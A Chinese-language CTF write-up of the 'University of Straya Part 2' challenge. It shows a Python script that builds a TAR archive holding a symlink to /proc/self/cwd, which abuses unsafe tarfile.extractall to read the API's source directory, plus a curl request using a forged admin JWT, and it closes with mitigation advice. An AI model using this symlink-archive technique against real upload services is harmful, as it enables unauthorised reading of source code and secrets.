# DownUnderCTF 2022 University of Straya Part 2 Writeup

## 题目简述

第二题沿用 Part 1 伪造的管理员 JWT，目标是读取 API 源码目录中的 `flag.txt`。归档类作业会由 Python `tarfile.extractall` 自动解压，随后应用递归列出、下载解压目录中的文件。TAR 符号链接被保留，形成任意目录读取。

## 解题过程

上传逻辑根据 MIME 类型选择 `extract_tar`：

```python
def extract_tar(path):
    extract_folder = os.path.join(Path(path).parent, 'extracted')
    with tarfile.open(path) as tar:
        tar.extractall(path=extract_folder)
    os.remove(path)
    return extract_folder
```

应用没有拒绝符号链接。与其把链接指向根目录并在大量文件中搜索，更精确的目标是 `/proc/self/cwd`：它始终指向当前 API 进程的工作目录，也就是源码所在位置。

生成只包含一个目录符号链接的 TAR：

```python
import tarfile

with tarfile.open('exploit.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo('submission')
    info.type = tarfile.SYMTYPE
    info.linkname = '/proc/self/cwd'
    tar.addfile(info)
```

使用管理员身份选择接受归档的 assessment，提交该文件。文件列表函数遇到 `submission` 时会把它当目录递归进入，于是响应列出 API 工作目录中的源码和 `submission/flag.txt`。

前端生成的普通 `<a>` 下载链接不会自动附带 Bearer token，所以直接点击可能仍然失败。应保留 Part 1 的管理员 JWT，手工请求返回的 submission ID 和文件路径：

```bash
curl -H 'Authorization: Bearer <admin-jwt>' \
  'http://target/api/assessments/submissions/<id>/download/submission/flag.txt'
```

返回内容为：

```text
DUCTF{t4r_t4r_tH4nK5_f4r_l1nK1nG_tH3_sAuCe!}
```

## 方法总结

漏洞由不安全 TAR 解压和后续跟随符号链接共同造成。`/proc/self/cwd` 比猜测容器源码绝对路径更稳定；同时，浏览器页面能列出文件不代表其下载链接带有 API 所需的授权头，复现时必须区分前端导航与带 Bearer token 的 API 请求。安全实现应在解压前拒绝链接和越界成员，并在打开下载目标后验证其真实路径仍处于本次提交目录内。
